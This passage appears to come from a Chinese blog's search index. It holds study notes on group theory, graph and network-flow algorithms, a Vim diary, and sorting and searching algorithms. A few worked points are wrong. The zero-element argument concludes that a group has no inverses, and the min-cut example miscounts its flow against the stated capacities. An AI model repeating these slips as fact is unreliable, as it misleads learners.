3.群无零元\n\t有零元代表该代数系统**无逆元**，而群的基本性质就是有逆元，因此冲突，推出群无逆元。注意周期大于等于 2。\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae1d0135ef.png)\n\n- 4. 一元一次群方程有解，且解唯一。\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae0941c74f.png)\n- 5. 群满足消去律\n\t ![image.png](https://pic.moyuin.top/2025/05/19/682ae1add7df3.png)\n- 6. 群的阶，`a^k=e` 相当于阶 `r|k`\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae3208eefd.png)\n\n### 子群\n类似于子集吧。子群，顾名思义就是一个群的一部分，一个代数系统的一部分。\n![image.png](https://pic.moyuin.top/2025/05/19/682ae502564ac.png)\n\n子群依然符合群的各种性质：\n- 封闭\n- 可结合\n- 单位元\n- 每个元素有逆元\n\n#### 子群快捷判断定理\n1.（1）任何 a, b 属于 H, 有 `a*b` 属于 H。\n（2）所有 a 属于 H 都有 a^-1 属于 H。\n![image.png](https://pic.moyuin.top/2025/05/23/68301c181bff4.png)\n2. 任何 a，b 属于 H 都有 `a*b^-1` 属于 H。（逆元混沌封闭）\n![image.png](https://pic.moyuin.top/2025/05/23/68301cdd800c7.png)\n3. 任意 a，b 属于 H 都有 `a*b` 属于 H。(只封闭)\n![image.png](https://pic.moyuin.top/2025/05/23/68301e5e1cd7c.png)\n\n#### 循环子群\n定义：由 a 的幂次方组成的子群称为循环子群或者生成子群，记为 `<a,*>` 或 `<a>`\n![image.png](https://pic.moyuin.top/2025/05/23/68302364aeafb.png)\n\n![image.png](https://pic.moyuin.top/2025/05/23/6830281205314.png)\n\n---\n### 陪集\n陪集是一种集合而非群，它相当于是一种映射关系的集合。\n![image.png](https://pic.moyuin.top/2025/05/23/68302940ab6a1.png)\n\n#### 定理\n1.（1）与单位元建立映射的右陪集等于原来的子群。\n（2）与常数项建立映射的右陪集等于原来的子群的倍。\n![image.png](https://pic.moyuin.top/2025/05/23/68302a88a4042.png) 2. 子群是对群的划分，是相同关系的集合。\n![image.png](https://pic.moyuin.top/2025/05/23/68302af68b0f4.png) 3. 陪集与等价关系\n![image.png](https://pic.moyuin.top/2025/05/26/68340d800bc99.png)\n对于等价类 `[a]`, 对于一个子群 H，它的所有的左（或者右）陪集的集合，本质上就是一个子群 H 的等价类的集合。\n- **核心都是划分：** 等价关系的核心作用是**划分 (Partition)** 一个集合。陪集的作用也完全一样，它将一个大群 G **划分**成若干个大小相等、互不相交的子集（陪集）。每个元素 g∈G 都属于且仅属于一个陪集。\n![image.png](https://pic.moyuin.top/2025/05/26/683411643a531.png)\n\n---\n\n### 拉格朗日定理\n特指子群元素的拉格朗日定理。结合刚才的群定理，总结出群的四个定理，前三条回顾。\n1. ![image.png](https://pic.moyuin.top/2025/05/26/683414773c58e.png)\n2.![image.png](https://pic.moyuin.top/2025/05/26/683414939463b.png)\n3.![image.png](https://pic.moyuin.top/2025/05/26/6834149e790c5.png)\n定理 3 还有一个推论：\n![image.png](https://pic.moyuin.top/2025/05/26/683414bb95ba9.png) \n\n**拉格朗日定理**\n![image.png](https://pic.moyuin.top/2025/05/26/68341541976c5.png)\n或者说，子群的元素个数是母群的因数。\n> **在一个有限群中，任何一个元素的阶，都必然能整除这个群的阶。**\n\n也有一种表达：\n>  对于一个有限群 `G` 和它的任意一个子群 `H`，群 `G` 的阶（元素个数，记作 ∣G∣）必然是子群 `H` 的阶（∣H∣）的整数倍。\n\n这是对于群 `G` 为有限群而言，子群 `H` 的陪集数目是有限的。\n当群 `G` 为无限群，陪集数可能有限，可能无限，要依赖选取的子群来确定。拉格朗日定理只适用于有限群。\n\n---\n### 置换群\n好像就是把洗牌的指令集合为群。\n![image.png](https://pic.moyuin.top/2025/05/26/6834188e3730f.png)\n\n乘积/复合：`σ ∘ τ` （或写作 `στ`），先按 `σ` 的指令操作，然后按 `τ` 的指令操作，构成一个新的排列。\n> **注意：** 在数学上，运算顺序通常是**从右往左**的。但是这里 PPT 上这么处理，所以跟着 PPT 的来吧。\n![image.png](https://pic.moyuin.top/2025/05/26/683418cec60f2.png)\n#### 定理\n![image.png](https://pic.moyuin.top/2025/05/26/683418ee50f18.png)\n就是把\"洗牌顺序\"，所有的方法集合，构成了一个置换群。\n\n---\n## 环与环域\n![image.png](https://pic.moyuin.top/2025/05/26/68341a84e329c.png)\n![image.png](https://pic.moyuin.top/2025/05/26/68341a9cf39ed.png)\n**群 → 环 → 域**，是一个能力不断增强，限制越来越严格的过程。**环是比群多了一个乘法运算的结构，域是比环多了一个除法运算的结构。**","tags":["学习","离散数学"],"categories":["日常学习","离散数学"]},{"title":"离散数学&数据结构-图论常匹配问题与算法概括","url":"/2025/05/12/xue-xi/shu-xue/chi-san-shu-xue-shu-ju-jie-gou-tu-lun-chang-pi-pei-wen-ti-yu-suan-fa-gai-gua/","content":"# 离散数学&数据结构-图论常匹配问题与算法概括\n## 基本图论算法\n### 一、最小生成树（Minimum Spanning Tree，MST）\n\n- **关键词**：连通、造价最小、覆盖所有点、不关注路径、不成环\n- **典型题干**：\n    \n    > 设计一个通信网络，使所有城市能互相通信且造价最小。\n- **常用算法**：\n    - **Kruskal**：按边权升序排序，逐条选入，不成环为准。\n    - **Prim**：从任意点出发，逐步扩展最短连边进集合。\n- **适用问题类型**：\n    - 网络建设、城市连接、铺设电缆、布线等\n\n---\n\n### 二、最短路径（Single/All Pairs Shortest Path）\n\n- **关键词**：从某点到某点路径最短、有向/无向图、有权图\n- **典型题干**\n    > 求 A 城市到其他城市的最短路径。\n- **常用算法**：\n    - **Dijkstra**：正权图单源最短路径（常用于地图/网路延迟）\n    - **SPFA**：负边权也能跑，适用于稀疏图\n    - **Floyd**：所有点对最短路径，三重循环（适用于稠密图）\n- **适用问题类型**：\n    - 地图导航、路线规划、网络延迟最小化\n---\n\n### 三、旅行商问题（Traveling Salesman Problem，TSP）\n\n- **关键词**：访问所有点、只访问一次、形成闭环、最短路径\n- **典型题干**：\n    > 某人需访问所有城市一次并返回起点，求最短路线。\n- **常用算法**：\n    - 暴力搜索 / 状压 DP / 分支限界 / 启发式搜索（如遗传算法）\n- **适用问题类型**\n    - 快递路线、外卖送货、城市巡回问题\n---\n\n### 四、中国邮路问题（Euler 回路）\n- **关键词**：走遍所有**边**一次、不重复、回到起点或不回起点\n- **典型题干**：\n    > 邮递员需要经过每条街道一次，如何规划路线？\n- **常用算法**：\n    - **Hierholzer 算法**：找欧拉回路或路径\n    - **判断条件**：\n        - 欧拉回路：所有点度数为偶数\n        - 欧拉路径：最多两个点为奇数度\n- **适用问题类型**：\n    - 邮递、清扫机器人、巡检线路问题\n---\n\n### 五、拓扑排序问题（DAG 上的排序）\n- **关键词**：有向无环图、先修课程、依赖关系、顺序安排\n- **典型题干**：\n    > 给定课程依赖关系，安排上课顺序。\n- **常用算法**：\n    - **拓扑排序（BFS/Kahn）**\n    - **DFS 建序列（逆后序）**\n---\n\n### 一眼看图识题技巧\n\n|问题关键词|属于哪一类|应用算法|\n|---|---|---|\n|连通、造价最小|最小生成树（MST）|Prim / Kruskal|\n|起点到各点最短|最短路径|Dijkstra / SPFA|\n|所有点走一圈|旅行商问题（TSP）|状压 DP / 搜索|\n|所有边走一遍|中国邮路（Euler 回路）|Hierholzer|\n|有依赖顺序安排|拓扑排序（DAG）|Kahn / DFS|\n\n---\n## 图论算法衍生\n### 网络流\n#### EK算法最大流\n最大流问题就是：\n > 想象你是个调水的管道工：\n> 有个**源点（source）**：水从这儿开始流。\n> 有个**汇点（sink）**：水最终要流到这。\n> 图里的每条边是水管，有个**最大能流多少水的限制（容量）**。\n> 你要解决的核心问题就是\n>   “从源点最多能往汇点送多少水？”\n\n- 问题：在给定容量限制下，从源点到汇点的最大可能流量。\n- 经典算法：Ford-Fulkerson（增广路径）、Edmonds-Karp（BFS）、Dinic（分层图 + DFS）。\n\nEK算法最大流是：\n>  用**广度优先**去找：从源点到汇点还有没有“能通的水路”。\n>  找到就“倒水”：找出这条路上最细的那根管子（瓶颈），推这么多流量。\n>  更新管道：把用掉的流量减去，剩下的再来。\n>  直到你怎么找都找不到新路了：那就是最大流了。\n\nEdmonds-Karp 是一种 **基于广度优先搜索（BFS）** 的最大流算法，属于 Ford-Fulkerson 方法的实现之一。\n**注意：离散数学考试给予简化版本，不维护反向边。**\n\n> 它的核心思想是：  \n> 每次用 BFS 在残量网络中找一条从源点 `S` 到汇点 `T` 的最短增广路径，然后将该路径上的可增广流量加入到总流中，并更新残量网络。\n##### 核心结构\n- **残量网络**：对于每条边 `(u,v)`，我们维护：\n    正向边容量 `c(u,v)`\n    当前流量 `f(u,v)`\n    残余容量 `r(u,v) = c(u,v) - f(u,v)`\n    并添加反向边 `(v,u)`，其残余容量为 `f(u,v)`，表示可以“退回”流量。\n\n假设你有如下图的网络：\n```markdown\nS --(10)--> A --(5)--> T\n \\                      /\n  \\----(15)------------/\n\n```\n你用 BFS 找到 `S->A->T`，可增广流为 `5`，再找 `S->T`，可增广流为 `15`。  \n总流量 `5 + 15 = 20`，路径更新后不能再增广，算法结束。\n\n#### 最小割\n- **割**：将所有节点分为两个集合 `S集合` 和 `T集合`，使得源点 `S` 在 `S集合`，汇点 `T` 在 `T集合`。\n- 最小割：在所有可能的割中，**跨越两个集合的边的容量之和最小的割**。\n\n- 问题：将图中点集分为两部分，使得源点在一侧，汇点在另一侧，割掉的边容量总和最小。\n- 定理：最大流 = 最小割。\n\t**在一个有向图中，从源点 `S` 到汇点 `T` 的最大流的大小，等于从 `S` 到 `T` 的最小割的容量。**\n\n\n> 最大流 = 能从水库 `S` 送到城市 `T` 的最多水量\n>  最小割 = 一刀下去能阻断的最小总水流（把某些管道切掉）\n> 换句话说：\n> 最大你能送的 = 最少别人能拦的\n\n\n```markdown\nS --(3)--> A --(2)--> T\n \\                  /\n  \\----(4)--------/\n\n```\n最大流是 5（S→A→T 走 2，S→T 走 3）\n最小割是割断 `S→T` 和 `A→T`（容量是 3+2=5）\n他们相等，定理成立。\n\n---\n\n| 术语        | 定义（通俗解释） |\n|-------------|------------------|\n| 网络流图    | 一个带有容量限制的有向图，每条边表示“能容纳多少流量”。 |\n| 源点（S）   | 流量的起点，像是“水库”或“工厂”。 |\n| 汇点（T）   | 流量的终点，像是“城市”或“消费者”。 |\n| 流量（Flow）| 实际通过边的流量，不能超过边的容量。 |\n| 容量（Capacity） | 边所能承受的最大流量，相当于“管道粗细”。 |\n| 残量网络    | 当前流量状态下，图中还可以继续“走”的路径与容量。 |\n| 增广路      | 在残量网络中，从源点到汇点还可以“加流”的路径。 |\n| 最大流      | 从源点到汇点能“加”上的最大总流量。 |\n| 割（Cut）   | 把图的点分成两个集合，源点在一边，汇点在另一边。 |\n| 割的容量    | 从源点集合通向汇点集合的边的容量总和。 |\n| 最小割      | 所有可能割中，容量最小的一个，表示“最小阻断能力”。 |\n| 最大流最小割定理 | 最大能通过的流量 = 最小能拦下的割。 |\n| EK算法（Edmonds-Karp） | 使用 BFS 查找增广路，逐步累加流量，直到没有增广路。时间复杂度 O(VE²)。 |\n| Dinic算法   | 更快的最大流算法，基于分层图+DFS增广。时间复杂度 O(V²E)（稀疏图较优）。 |\n\n","tags":["学习","数学","数据结构"],"categories":["日常学习","数据结构","离散数学"]},{"title":"Vim 学习 Daily","url":"/2025/05/06/sheng-huo/ji-lu/vim-xue-xi/","content":"# Vim 学习\n## 学习前哔哔几句\n我终于来学习 vim 了！！之前就很想做到写代码扔掉鼠标，特别是鼠标滚轮，把手离开键盘然后又放回去实在是太影响编程体验了...所以开始玩一下vim吧。记录一些小指令避免我忘记。\n\n## DAY 1\nH J K L 要触发一种联想的话还是挺难的，我目前只能用一种最死记硬背的方式习惯它。\n![image.png](https://pic.moyuin.top/2025/05/06/681a1238f0ec0.png)\n\nH最左，L最右，J有一个下钩子，K就是最后的向上咯...\n\n---\nvim 有三种模式，鉴于之前 linux 系统的影响我还是了解一些的。\n- 输入 : 进入 命令模式 \n\t`:wq` 直接保存，`: 1` 据说可以跳转到第一行。\n- 输入 i 进入输入模式\n\t进入输入模式的时候就和普通的输入没啥区别了，但是一些快捷键好像用不了，比如ctrl+A这种全选的，vim有着自己的全选命令。\n- 输入 v 进入视觉模式\n\t有啥用还没摸索出来，到时候看看。\n![image.png](https://pic.moyuin.top/2025/05/06/681a12e293631.png)\n\n---\n## DAY 2\n\n`dd` 删除当前行\n`gg` 去第一行\n`u` 撤销\n好不习惯😵‍💫，这些得在**normal**模式下用。\n\n---\n## DAY 3\n`p` 是直接粘贴\n`dG` 删除下面所有行，配合 `gg` 直接去开头做到全选删除\nnano 的全选我都不会呢...vim 开始有点用处了🥰\n\n---\n## DAY 4\n然后输入 `yG` 提示下图 `xx lines yanked` 成功即可\n![image.png](https://pic.moyuin.top/2025/05/09/681e16be2943e.png)\n\n但是这样 vim 只是放在了 vim 寄存器里面，对于 vscode 的 vim 插件，需要开启这个功能\n`\"vim.useSystemClipboard\": true`\n才可以复制到系统剪切板里。\n当然，你也可以用 `\"+yG` 直接加入系统剪切板，不过我嫌它麻烦。\n![image.png](https://pic.moyuin.top/2025/05/09/681e16882c4f7.png)\n\n*越来越习惯用 vim 写代码了*🥰\n\n---\n## DAY 5\n`0` 去往该行行首\n`$` or `end` 去该行行末\n\n`G` 向下移动到最后一行\n`gg` 回到第一行\n`nG`配合数字，前往第 n 行\n`n<space>` 去该行的第 n 个字符\n\n---\n## DAY 6\n`A`直接跳到行尾然后开始编辑\n`g_` 也是跳到最后一个字符\n","tags":["学习","计划"],"categories":["日常学习"]},{"title":"数据结构-排序与查找","url":"/2025/04/22/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-pai-xu-yu-cha-zhao/","content":"# 数据结构-排序\n\n## 排序分类\n### 稳定性分类\n若**序列中关键字值相等的节点经过某种排序方法进行排序之后，仍能保持它们在排序前的相对顺序**，则称这种排序方法是稳定的；否则，称这种排序方法是不稳定的。\n![ ](https://img.moyuin.top/i/2025/04/22/6806fc01136af.png)\n\n- 稳定排序算法：\n\t- 插入排序\n\t- 冒泡排序\n\t- 归并排序\n- 不稳定排序算法：\n\t- 选择排序\n\t- 希尔排序\n\t- 快速排序\n\t- 堆排序\n\t\n### 内存使用情况分类\n- 内部排序：数据存储和位置调整均在内存中进行\n- 外部排序：大部分数据元素存储在外存，借助内存进行位置调整\n\n### 据排序实现手段分类\n- 基于“比较-交换”的排序：通过对关键字的比较，交换关键字在序列中的位置 l 插入排序、冒泡排序、选择排序、快速排序、归并排序、希尔排序、堆排序\n- 基于“分配”的排序：通过将元素进行分配和收集进行排序 l 桶排序、计数排序和基数排序\n### 难易程度分类 \n- 基本排序：插入排序、冒泡排序、选择排序、……\n- 高级排序：快速排序、归并排序、堆排序、基数排序、……\n## 经典排序\n### 插入排序\n**基本思想**：将一个记录插入到已经排好序的序列中，形成一个新的、记录数增1的有序序列 。\n![ ](https://img.moyuin.top/i/2025/04/22/6806fd4235798.png)\n\n我们一般使用直接插入排序。将`A[i]`插入有序序列，让前面所有的元素比它大/小，从而得到新有序序列。\n![ ](https://img.moyuin.top/i/2025/04/22/6806fde5b07cf.png)\n\n时间复杂度：平均为`O(n^2)`\n空间复杂度： `O(1)`\n#### **折半插入排序**\n二分法进入排序,即为**折半插入排序**,查找位置时间复杂度为`O(logn)`,但是元素挪动依然为`O(n)`,所以整体的时间复杂度为`O(n^2)`\n\n#### 希尔排序\n**基本原理**：先对所有记录按**增量**(d)进行分组，组内进行插入排序；然后减少增量重复上述步骤，直至增量为1 。\n**画线可以连接在一起的视为一个组，比如示例，57，48，66为一个组，进行比较的时候57与48交换，交换后也要考虑57和66是否可以互相交换。**\n![image.png](https://pic.moyuin.top/2025/05/13/6822ef3d3770b.png)\n\n\n**时间复杂度**：依赖于增量序列，没有确切结论，可以优于 O(n2)，例如某些情况下可达到 O(nlog2n) 或 O(n^3/2) 。\n- 选一个初始 gap，比如 n/2\n- 按 gap 把数组分成若干组\n- 对每组做插入排序\n- 缩小 gap，比如 gap /= 2\n- 重复直到 gap = 1（就是普通插排）\n---\n### 简单选择排序\n**基本思想**：**首先选出最小的项，与第一个项交换；然后在剩余项中选出次小的项，与第二个项交换**；以此类推，直到整个序列有序 。\n![image.png](https://pic.moyuin.top/2025/05/13/6822ef207dcbe.png)\n\n- **过程**：每次在未排序序列中找到最小（或最大）元素，存放到排序序列的起始位置 。  \n- **性能**：\n    - 时间复杂度：O(n^2) (最佳、最坏、平均情况均为 O(n^2) 次比较) 。       \n    - 空间复杂度：O(1) 。\n### 堆排序\n**基本思想**：将待排序序列构造成一个大顶堆（或小顶堆），此时堆顶元素即为最大（或最小）值。将其与末尾元素交换，然后将剩余n-1个元素重新调整为堆，重复此过程 。\n![](https://pic.moyuin.top/2025/05/13/6822ff1c9ca87.png)\n![image.png](https://pic.moyuin.top/2025/05/13/6822ffb93f7c1.png)\n![image.png](https://pic.moyuin.top/2025/05/13/68230027ccde9.png)\n\n**过程**：包括建堆和调整堆两个主要步骤 。\n先看建立堆过程吧。\n![image.png](https://pic.moyuin.top/2025/05/13/682300a81fde4.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300c8137b0.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300d308554.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300dcca925.png)\n\n\n**性能**：\n- 时间复杂度：O(nlogn) 。  \n- 空间复杂度：O(1) 。\n### 交换排序\n**核心思路**：对序列中的元素进行多次两两交换，从而使序列元素有序 。\n#### 冒泡排序\n**基本思想**：依次比较相邻两个元素，如果反序则交换，重复操作直到整个序列有序。每趟排序会将当前未排序部分的最大（或最小）元素\"冒泡\"到最终位置 。\n![image.png](https://pic.moyuin.top/2025/05/13/6822f27f1f2f3.png)\n\n![image.png](https://pic.moyuin.top/2025/05/13/6822efdc611e9.png)\n\n\n**性能**：\n- 时间复杂度：O(n2) 。  \n- 空间复杂度：O(1)。\n#### 快速排序\n**基本思想**：通过递归分治方法，基于轴点 (pivot) 将待排序序列拆分成两个子序列（**左边元素均小于等于轴点，右边元素均大于等于轴点**），然后对两个子序列分别递归排序 。\n\n- **选定轴点**：通常是当前子序列最后一个元素（也可以是别的，但这是经典选择）。\n\n- **分区过程**：\n    - 使用左右指针（或一个指针`i`）遍历序列。\n    - 保证所有小于轴点的元素在左边，大于等于轴点的在右边。\n    - **划定边界**：找出最终轴点应该插入的位置，把它交换过去。\n    \n- **递归处理**：\n    - 以轴点为界，继续分别对左子序列和右子序列进行快速排序。\n        \n- **终止条件**：\n    - 子序列长度为 0 或 1，说明那一段已经有序，无需继续处理。\n    \n![image.png](https://pic.moyuin.top/2025/05/13/6822f634c5e24.png)\n\n快排比较复杂，这里给一个拆分示例，轴点寻找和插入位置寻找不看图不行。（**这里使用的是左右双指针法**）：\n\n👇 初始数组：\n```\n[10, 20, 15, 4, 1, 9, 6]\n```\n我们使用最简单直观的 **Lomuto 分区法**（用最后一个元素当轴点）。每一次递归我们都分区 + 继续快排子数组。\n\n---\n ✅ 第一次快排（全数组）\n**数组**：`[10, 20, 15, 4, 1, 9, 6]`  \n**pivot**（轴点）= `6`  \n**i = -1**\n\n遍历 j=0 到 j=5：\n\n- `10 > 6` → 跳过\n- `20 > 6` → 跳过\n- `15 > 6` → 跳过\n- `4 < 6` → `i=0`, 交换 `arr[0] ↔ arr[3]` → `[4, 20, 15, 10, 1, 9, 6]`\n- `1 < 6` → `i=1`, 交换 `arr[1] ↔ arr[4]` → `[4, 1, 15, 10, 20, 9, 6]`\n- `9 > 6` → 跳过\n\n结束后，`i = 1`，交换 `arr[2] ↔ pivot (arr[6])`  \n→ 最终：[4, 1, 6, 10, 20, 9, 15]\n\n现在 `6` 已经在正确的位置了！\n\n---\n 🎯 快排左边 `[4, 1]`\npivot = `1`  \ni = -1\n- `4 > 1` → 跳过\n结束后 i = -1，交换 `arr[0] ↔ arr[1]`  \n→ `[1, 4]`，完成了！\n\n---\n\n🎯 快排右边 `[10, 20, 9, 15]`\npivot = `15`  \ni = 2（`6` 已经在前面了）\n从 j=3 开始：\n- `10 < 15` → `i=3`, 交换 `arr[3] ↔ arr[3]`（自交换）\n- `20 > 15` → 跳过\n- `9 < 15` → `i=4`, 交换 `arr[4] ↔ arr[5]`  \n    → `[1, 4, 6, 10, 9, 20, 15]\n交换 pivot `arr[6]` 和 `arr[5]` → `[1, 4, 6, 10, 9, 15, 20]`\n\n---\n\n🎯 快排 `[10, 9]`\npivot = `9`\n- `10 > 9` → 跳过\n交换 `arr[3] ↔ arr[4]`  \n→ `[1, 4, 6, 9, 10, 15, 20]`\n\n---\n✅ 最终结果：\n```\n[1, 4, 6, 9, 10, 15, 20]\n```\n\n---\n\n\n\n\n\n**性能**：\n- 时间复杂度：平均 O(nlogn)，最坏 O(n2) (当序列已基本有序或轴点选择不佳时) 。  \n- 空间复杂度 (递归栈深度)：平均 O(logn)，最坏 O(n) 。\n\n### 归并排序\n- **核心思路**：基于分治思想，将两个或两个以上的有序序列合并为一个新的有序序列 。  \n- **归并次序** ：  \n    - **自顶向下**：将序列递归拆分到单个元素，然后两两合并。\n\t    ![image.png](https://pic.moyuin.top/2025/05/13/6822f2ae78335.png)\n\n    - **自底向上**：将序列看作n个长度为1的有序子序列，然后两两合并，直到合并为一个序列。\n\t    ![image.png](https://pic.moyuin.top/2025/05/13/6822f2c9130de.png)\n\n- **二路归并 (Two-Way Merge)**：将两个有序序列合并为一个新的有序序列，时间复杂度为 O(m+n)，其中m和n为两个序列的长度 。  \n- **性能**：\n    - 时间复杂度：O(nlogn) (自顶向下和自底向上均为) 。  \n    - 空间复杂度：O(n) (需要额外的辅助空间) 。  \n\n- **应用**：求逆序对数量 。\n\n### 分配排序\n不基于“比较-移动”的排序方式。\n#### 计数排序\n- - **假设**：输入元素是 0 到 k 之间的一个整数 。  \n    - **基本思想**：统计每个元素出现的次数，然后根据计数确定每个元素在输出数组中的位置 。  \n    - **性能**：\n        - 时间复杂度：O(n+k)，当 k 为 O(n) 时，复杂度为 O(n) 。  \n        - 空间复杂度：O(n+k) 。  \n\n#### 桶排序\n- - **基本思想**：将元素分配到有限数量的桶中，然后对每个桶内的元素进行排序（通常用插入排序），最后依次连接各桶中的元素得到有序序列 。 \n    - **与计数排序关系**：计数排序可以看作是桶排序的一种特殊情况，其中每个桶只包含相同值的元素 。  \n    - **性能**：\n        - 时间复杂度：平均 O(n+kn2​+k) (假设均匀分配到k个桶)，如果元素能均匀分配，可以达到 O(n) 。最坏 O(n2) 。  \n        - 空间复杂度：O(n+k) 。  \n\n#### 基数排序\n- **核心思路**：将待排序元素看作基于基数（如十进制的10）的元组表示，然后从最低位（LSD）或最高位（MSD）开始，对每一位进行排序（通常使用计数排序作为子排序算法） 。  \n    ![image.png](https://pic.moyuin.top/2025/05/13/68230a0966517.png)\n\n- **分类**：\n    - **最低位优先 (LSD) 基数排序** ：从最低位到最高位，逐位进行稳定排序。  \n    - **最高位优先 (MSD) 基数排序** ：从最高位开始，递归地对子序列进行排序。  \n        \n- **性能** (设n个元素，每个元素有d位，基数为k)：\n    - LSD时间复杂度：O(d(n+k)) 。  \n    - MSD时间复杂度：最坏 O(d⋅n⋅k)，平均也类似 。  \n    - 空间复杂度：O(n+k) 。  \n\t\n### 索引排序\n- **核心思路**：创建一个索引序列，排序时不直接移动原序列中的元素，而是移动索引。排序完成后，索引序列指明了原序列元素应有的顺序。这在元素移动和拷贝代价很大时非常有用 。   \n- **元素顺序调整**：得到排序后的索引序列后，可以根据索引将原序列元素调整到正确位置。\n\n![ ](https://pic.moyuin.top/2025/05/12/68219fdb8c19f.png)\n\n---\n# 数据结构-查找\n## 基本查找算法\n### 顺序查找\n一个一个查，O(n)\n\n### 二分查找\n中位 middle=`(low+high)/2`\nlow 和 high 要随时改成 middle+1 (去右边找)或者 middle-1 （去左边找）\n时间复杂度 O(logn)\n\n---\n### 索引查找（分块查找）\n- 创建存储数据的表，再根据要求建立相应索引\n（如创建字典目录，有点像 unordered_map 建立映射）\n- 索引查找需要牺牲空间，从而降低时间复杂度\n#### 如何构建索引？\n- 表中数据分块，使得内部分块的关键字值都大于或小于下一个块。称为“分块有序”。\n- 为每块建立一个索引项，包含 `key` 和 `index` 。即关键码字段和指针字段。\n- 通过`key` 找到关键字值的记录块，然后在块内进行 **顺序查找或者二分查找**\n\t![ ](https://pic.moyuin.top/2025/05/06/681972101597a.png)\n\n其实时间复杂度也是线性，但是依赖于块数据的大小与块内查找方式。\n![ ](https://pic.moyuin.top/2025/05/06/681972634d44b.png)\n- O(s)与O(logs)的查找时间，还得看分块的大小。\n\n---\n## 二叉查找树 （BST）\n### 基本定义\n二叉查找树或者是一棵空树；\n或者是具有如下特性的二叉树： \n- 若根结点的左子树不空，则左子树上所有结点的值均小于根结点的值；\n- 若根结点的右子树不空，则右子树上所有结点的值均大于根结点的值；\n性质：**任何二叉查找树的中序遍历都是有序序列**\n且一般规律是: 任意左子树的值 < 根节点的值 < 对应右子树的值。\n![ ](https://pic.moyuin.top/2025/05/06/6819743c74b9c.png)\n\n### 查找\n如果要在二叉查找树寻找关键值 `key` ,基本原理和二分查找相同。如果给定值比当前节点小则去当前节点的左子树继续寻找，大则去右子树继续寻找。\n![ ](https://pic.moyuin.top/2025/05/06/6819755227c8c.png)\n\n时间复杂度为 O(h),h为树的高度。基本也就是进行递归调用。\n\n对于其时间复杂度，性能最差可能会退化到线性查找。\n![ ](https://pic.moyuin.top/2025/05/06/68197f1c9f9d9.png)\n![ ](https://pic.moyuin.top/2025/05/06/68197f320c789.png)\n\n\n### 二叉树插入算法\n注意：**插入位置是节点从根节点比较一步一步确定的，小于该节点移到左侧与左节点比较，反之同理，不是随便写的。**\n也是利用查找，确定好要进入的树节点，从而插入值。\n**“插入”操作在查找不成功时才进行**。如果树中存在该值，BST 不允许有重复值。\n![ ](https://pic.moyuin.top/2025/05/06/6819771990a1b.png)\n\n### 二叉查找树的建立\n将根节点设置为一个空集（变成可以设定为一个无限小），然后往下查找往下画即可。\n\n### 二叉查找树的删除\n删除可分三种情况讨论： \n（1）被删除的结点是叶子 ，不用管孩子，很简单\n![ ](https://pic.moyuin.top/2025/05/06/68197c6df26f8.png)\n\n（2）被删除的结点只有左子树或者只有右子树 ，像链表一样需要删除节点的操作\n![ ](https://pic.moyuin.top/2025/05/06/68197c8725d4c.png)\n\n（3）被删除的结点既有左子树，也有右子树。这个比较复杂，与堆的那个操作不太一样。\n相当于在序列里将其往前移动一格，拼起来。\n![ ](https://pic.moyuin.top/2025/05/06/68197ca755bb7.png)\n\n## 平衡二叉树（AVL树）\n### 基本定义\nAVL树或者是一棵空树，或者是具有下列性质的二叉查找树： \n- 左、右子树都是平衡二叉树； \n- 左、右子树的高度差绝对值不超过1。（这里的高度差左子树高度-右子树高度）\n![ ](https://pic.moyuin.top/2025/05/06/6819815d362ff.png)\n\n### 构造AVL树\n看个例子。所谓**平衡旋转**，左旋和右旋，就是：\n> **右旋 = 左子过重时，把左儿子提上来当新根，把原根放到右边；左儿子的右子（如果有）会变成原根的左子。**\n\n> **左旋 = 右子过重时，把右儿子提上来当新根，把原根放到左边；右儿子的左子（如果有）会变成原根的右子。**\n\n![ ](https://pic.moyuin.top/2025/05/06/681981a599c96.png)\n![ ](https://pic.moyuin.top/2025/05/06/6819822c4d942.png)\n\n### 将BST转化为AVL\n![ ](https://pic.moyuin.top/2025/05/06/6819847d7e3d3.png)\n#### 平衡化旋转\n![ ](https://pic.moyuin.top/2025/05/06/681984a26bbb9.png)\n\n#### 失衡调整旋转平衡处理\n- 第一个字母代表：**失衡节点是哪个子树高了**（L = 左子树，R = 右子树）\n- 第二个字母代表：**哪边插入导致了这个子树变高**（L = 左边插入，R = 右边插入）\n图例\n- 单调右旋 （LL）\n\t![ ](https://pic.moyuin.top/2025/05/13/6822a9dc26338.png)\n\n- 单调左旋（RR）\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa0aa6af7.png)\n\n- 先左后右旋 （LR）\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa1910657.png)\n\n- 先右后左旋转（RL）\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa29095e7.png)\n\n### 插入\nAVL树的新结点的插入过程包括两个步骤：\n- 结点插入： 按照BST构建方法插入，同时更新平衡因子\n- 平衡化：如果插入过程中出现不平衡，采用**平衡化调整**，以保持AVL的性质\n\n插入有一个递归算法，太长了...\n\n### 删除\n![image.png](https://pic.moyuin.top/2025/05/13/6822b48508436.png)\n\n---\n\n##  散列查找 | 哈希查找\n建立映射，`unordered_map`的伟大无需多言。\n散列查找需要建立某种哈希函数，通过某种数学方法将数据转化为哈希地址，建立一个哈希表，映射建立。\n**由于哈希函数是一个压缩映射**，因此在一般情况下**容易产生冲突**，避免冲突，要么就哈希地址更复杂，要么就哈希函数更复杂。\n\n> 很难找到一个不产生冲突的散列函数。一般情况下，只能选择恰当的散列函数，使冲突尽可能少地产生。\n\n### 散列函数 | 哈希函数\n一般来说，一个好的散列函数应满足下列两个条件： \n- 计算简单 \n- 冲突少\n\n常见的哈希函数构造方法有：\n- 直接地址存储法 \n- 数字分析法\n- 平方取中法 \n- 折叠法 \n- 除留余数法 \n- 随机数法\n\n#### 直接地址存储法\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba1cd89c6.png)\n\n\n#### 数字分析法\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba49733cc.png)\n\n#### 平方取中法\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba5da25cd.png)\n\n平方取中法思想：**以关键字的平方值的中间几位作为存储地址。**\n关键字的各位都在平方值的中间几位有所贡献，Hash 值中应该有各位影子。\n\n#### 